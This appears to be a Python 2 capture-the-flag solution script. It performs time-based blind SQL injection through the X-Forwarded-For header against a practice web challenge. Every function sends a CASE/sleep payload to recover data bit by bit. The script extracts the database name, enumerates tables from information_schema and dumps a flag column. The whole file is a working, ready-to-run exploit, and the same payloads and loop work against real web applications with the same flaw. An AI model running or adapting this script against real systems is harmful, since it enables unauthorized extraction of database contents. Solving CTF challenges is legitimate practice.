import requests
import time
import sys

url = 'http://ctf5.shiyanbar.com/web/wonderkun/index.php'


def retriveCurrentDatabase():
    ascii = -1
    index = 1
    result = ""

    while "\x00" not in result:
        ascii = 0
        for i in range(8):
            sql = "222' and (case when (ascii(substring((select database()) from %d for 1))&%d!=0) then sleep(2) else sleep(0) end) and '1'='1" % (index, pow(2, i))
            print sql
            headers = {'X-Forwarded-For': sql}
            starttime = time.time()
            requests.get(url, headers=headers)

            if (time.time() - starttime) > 0.5:

                ascii += pow(2, i)

        if chr(ascii) != '\x00':
            sys.stdout.write(chr(ascii))
        result += chr(ascii)

        index += 1

    return result

def retriveTable(database):

    database = "'" + database + "'"

    ascii = -1
    row = 0
    while True:

        index = 1
        result = ""

        while "\x00" not in result:

            ascii = 0

            for i in range(8):

                sql = "222' and (case when (ascii(substring((select table_name from information_schema.tables where table_schema=%s limit 1 offset %d) from %d for 1))&%d!=0) then sleep(0.5) else sleep(0) end) and '1'='1" % (database, row, index, pow(2, i))
                headers = {'X-Forwarded-For': sql}
                starttime = time.time()
                requests.get(url, headers=headers)

                if (time.time() - starttime) > 0.5:

                    ascii += pow(2, i)

            if chr(ascii) != '\x00':
                sys.stdout.write(chr(ascii))
            result += chr(ascii)

            index += 1

        if result == '\x00':
            break
        ascii = -1
        print('')
        row += 1

def dumpColumn():

    ascii = -1
    row = 0
    while True:

        index = 1
        result = ""

        while "\x00" not in result:

            ascii = 0

            for i in range(8):

                sql = "222' and (case when (ascii(substring((select flag from flag limit 1 offset %d) from %d for 1))&%d!=0) then sleep(0.5) else sleep(0) end) and '1'='1" % (row, index, pow(2, i))
                headers = {'X-Forwarded-For': sql}
                starttime = time.time()
                requests.get(url, headers=headers)

                if (time.time() - starttime) > 0.1:

                    ascii += pow(2, i)

            if chr(ascii) != '\x00':
                sys.stdout.write(chr(ascii))
            result += chr(ascii)

            index += 1

        if result == '\x00':
            break
        ascii = -1
        row += 1

def main():
    database = retriveCurrentDatabase()
    print('\nCurrent database is %s' % database)
    print('Let\'s see the table name in the database!')
    database = database.replace("\x00","")
    retriveTable(database)
    print('Let\'s dump the flag!')
    sys.stdout.write("ctf{")
    dumpColumn()
    sys.stdout.write("}")
    # for i in range(8):
    #     print pow(i, 2)

if __name__ == '__main__':
    main()